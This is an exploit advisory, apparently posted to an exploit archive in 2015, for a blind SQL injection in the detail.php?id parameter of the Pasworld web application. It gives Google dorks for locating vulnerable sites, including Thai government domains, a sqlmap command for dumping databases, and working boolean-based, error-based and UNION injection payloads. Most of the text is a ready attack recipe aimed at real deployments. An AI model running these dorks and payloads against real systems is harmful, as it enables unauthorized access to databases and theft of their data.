@@ -1,0 +1,53 @@
+=========================================================
+
+[+] Title                :-   Pasworld detail.php Blind Sql Injection Vulnerability 
+[+] Date                 :-   5  -  June  -  2015
+[+] Vendor Homepage:     :-   http://main.pasworld.co.th/
+[+] Version              :-   All Versions
+[+] Tested on            :-   Nginx/1.4.5, PHP/5.2.17, Linux - Windows
+[+] Category             :-   webapps
+[+] Google Dorks         :-   intext:"Powered By :: PAS World Communitcation" inurl:detail.php 
+                              site:go.th inurl:"detail.php?id="
+[+] Exploit Author       :-   Shelesh Rauthan (ShOrTy420 aKa SEB@sTiaN)
+[+] Team name            :-   Team Alastor Breeze
+[+] The official Members :-   Sh0rTy420, P@rL0u$, !nfIn!Ty, Th3G0v3Rn3R
+[+] Greedz to            :-   @@lu, Lalit, MyLappy<3, Diksha
+[+] Contact              :-   fb.com/shelesh.rauthan, indian.1337.hacker@gmail.com, shortycharsobeas@gmail.com
+
+=========================================================
+
+[+] Severity Level          :- High
+[+] Request Method(s)       :- GET / POST
+[+] Vulnerable Parameter(s) :- detail.php?id=
+[+] Affected Area(s)        :- Entire admin, database, Server
+
+ 
+=========================================================
+
+[+] About :-  Unauthenticated SQL Injection via "detail.php?id=" parameter
+ 
+[+] SQL vulnerable File :- /home/DOMAIN/domains/DOMAIN.go.th/public_html/detail.php
+ 
+[+] POC    :-  http://127.0.0.1/detail.php?id=[SQL]'
+
+SQLMap
+++++++++++++++++++++++++++
+python sqlmap.py --url "http://127.0.0.1/detail.php?id=[SQL]" --dbs
+++++++++++++++++++++++++++
+
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=152 AND 1414=1414
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=152 AND (SELECT 1163 FROM(SELECT COUNT(*),CONCAT(0x7162766271,(SELECT (CASE WHEN (1163=1163) THEN 1 ELSE 0 END)),0x7162707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (random number) - 9 columns
+    Payload: id=-7470 UNION ALL SELECT 5982,5982,5982,5982,5982,CONCAT(0x7162766271,0x4b437a4a565555674571,0x7162707671),5982,5982,5982#
+
+
+
+=========================================================
